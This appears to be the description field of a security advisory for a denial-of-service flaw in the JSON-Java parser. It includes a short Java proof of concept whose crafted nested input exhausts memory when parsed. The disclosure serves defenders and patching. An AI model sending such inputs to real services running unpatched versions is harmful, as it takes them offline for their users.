    "Description": "### Summary\nA denial of service vulnerability in JSON-Java was discovered by [ClusterFuzz](https://google.github.io/clusterfuzz/).  A bug in the parser means that an input string of modest size can lead to indefinite amounts of memory being used. There are two issues: (1) the parser bug can be used to circumvent a check that is supposed to prevent the key in a JSON object from itself being another JSON object; (2) if a key does end up being a JSON object then it gets converted into a string, using `\\` to escape special characters, including `\\` itself. So by nesting JSON objects, with a key that is a JSON object that has a key that is a JSON object, and so on, we can get an exponential number of `\\` characters in the escaped string.\n\n### Severity\nHigh - Because this is an already-fixed DoS vulnerability, the only remaining impact possible is for existing binaries that have not been updated yet.\n\n### Proof of Concept\n```java\npackage orgjsonbug;\n\nimport org.json.JSONObject;\n\n/**\n * Illustrates a bug in JSON-Java.\n */\npublic class Bug {\n  private static String makeNested(int depth) {\n    if (depth == 0) {\n      return \"{\\\"a\\\":1}\";\n    }\n    return \"{\\\"a\\\":1;\\t\\0\" + makeNested(depth - 1) + \":1}\";\n  }\n\n  public static void main(String[] args) {\n    String input = makeNested(30);\n    System.out.printf(\"Input string has length %d: %s\\n\", input.length(), input);\n    JSONObject output = new JSONObject(input);\n    System.out.printf(\"Output JSONObject has length %d: %s\\n\", output.toString().length(), output);\n  }\n}\n```\nWhen run, this reports that the input string has length 367. Then, after a long pause, the program crashes inside new JSONObject with OutOfMemoryError.\n\n### Further Analysis\nThe issue is fixed by [this PR](https://github.com/stleary/JSON-java/pull/759).\n\n### Timeline\n**Date reported**: 07/14/2023\n**Date fixed**: \n**Date disclosed**: 10/12/2023",
